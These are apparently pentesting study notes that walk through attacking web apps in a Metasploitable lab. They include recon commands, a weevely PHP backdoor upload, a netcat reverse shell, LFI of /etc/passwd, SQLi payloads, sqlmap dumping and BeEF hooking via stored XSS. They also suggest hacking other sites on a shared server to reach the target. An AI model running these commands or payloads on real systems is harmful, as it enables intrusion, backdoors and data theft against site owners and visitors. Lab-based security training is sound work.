# Website Hacking

1. [Information Gathering](#information-gathering)

2. [File Vulnerabilities](#file-vulnerabilities)

3. [SQL Injection Vulnerabilities](#sql-injection-vulnerabilities)

4. [Cross Site Scripting Vulnerabilities](#cross-site-scripting-vulnerabilities)

5. [Discovering Vulnerabilities Automatically](#discovering-vulnerabilities-automatically)

For this section, the Metasploitable machine can be used with Kali, as we'll be making use of the web files stored in the former and attack it on using the latter. We can visit the Metasploitable website by simply using the IP address of the machine.

## Information Gathering

---

* [Whois Lookup](https://whois.domaintools.com/) can be used to find info about owner of target.

* [Netcraft](https://sitereport.netcraft.com/) shows the technologies used on the target.

* [Robtex](https://www.robtex.com/) shows comprehensive info about target.

* If we cannot hack our target website, we can hack other websites on the same server, to gain target access. To find websites on the same server, use Robtex DNS lookup (names pointing to same IP address).

* Knock can be used to find subdomains of target website:

```shell
knockpy google.com #shows subdomains of google.com
```

* Dirb can be used to find files & directories in target website:

```shell
man dirb #info about dirb

dirb http://10.0.2.5/mutillidae #uses default wordlist file to check directories

#this will give a list of discovered files for more info
```

## File Vulnerabilities

---

* File upload vulnerabilities allow users to upload executable files.

* Weevely can be used to generate PHP shells (backdoors) and gain access:

```shell
weevely generate 1234 /root/shell.php #generates a php shell with the password '1234'

#now the shell can be uploaded in the target website
#weevely can be used to interact with the uploaded file
#we have to give url of uploaded file and password

weevely http://10.0.2.5/dvwa/hackable/uploads/shell.php 1234 #this will give access to target file system
```

* Code execution vulnerabilities allow us to execute OS code on target server.

* Netcat can be used for this as it listens and connects computers:

```shell
nc -vv -l -p 8080 #using netcat to listen on port 8080

#now, we can try to connect from target server to our computer using the code execution vulnerability
nc -e /bin/sh 10.0.2.7 8080 #this command to be entered in the website
```

* Local file inclusion vulnerabilities allow us to read files on the same server. This can be exposed through the URL. For example, the URL can be manipulated to view the files in the directory /etc/passwd.

* Remote file inclusion vulnerabilities allow us to read files from any server. This can be done by uploading PHP shells and payloads.

## SQL Injection Vulnerabilities

---

* SQL Injection vulnerabilities can give complete access to the databases and other files. To try and discover SQL injections, we need to browse through the target and try to break each page.

* SQLi examples:

    1. ' - this can be used to break the page
    2. a' or 1=1# - the first part contains a quote to end the query, the second part is always true so it gets executed, pound sign is used to comment any query following this
    3. username' #

* SQLi can be done by manipulating the URL as well (if URL contains parameters such as = or ?, for example). Note that we have to encode special characters in URL; like converting # to %23.

* SQLMap is a tool used to exploit SQLi:

```shell
sqlmap -u "http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=admin&password=passd&user-info-php-submit-button=View+Account+Details"

sqlmap --help

sqlmap -u "http://10.0.2.5/mutillidae/index.php?page=user-info.php&username=admin&password=passd&user-info-php-submit-button=View+Account+Details" --tables -D owasp10 #this will show the tables from the database 'owasp10'
```

* To prevent SQLi, one must use parameterized statements, by separating data from code.

## Cross Site Scripting Vulnerabilities

---

* XSS vulnerabilities allow us to inject JS code into the page, executed when the page loads.

* Reflected XSS are non-persistent and not stored in the website. It works only if target visits a specific URL.

* Similar to SQLi, XSS attacks can be done easily if URL contains specific parameters, or if there are text boxes in the website. For example, entering ```<script>alert("XSS")</script>``` in a text box will result in website prompting "XSS" due to the vulnerability.

* Stored XSS is persistent on the page, executed everytime it's loaded. Similar XSS attacks can be done to achieve the intended effect.

* BeEF can be used too to hook a URL and inject it into the stored XSS page. So, anyone who visits that page will be hooked to BeEF.

* To hook to BeEF, we have to simply insert the hook script with our IP into the textbox in the target website. With stored XSS attacks, anyone who visits that page will be hooked to BeEF.

* To prevent XSS vulnerabilities, minimise usage of user input in HTML and filter the input before inserting into page.

## Discovering Vulnerabilities Automatically

---

* ZAP (Zed Attack Proxy) tool is used to automatically find vulnerabilities in web apps.

* While pentesting a particular website, we have to try all vulnerabilities with the parameters of each subdomain.

* Pentest reports are documents that include all of our findings for the client to understand.
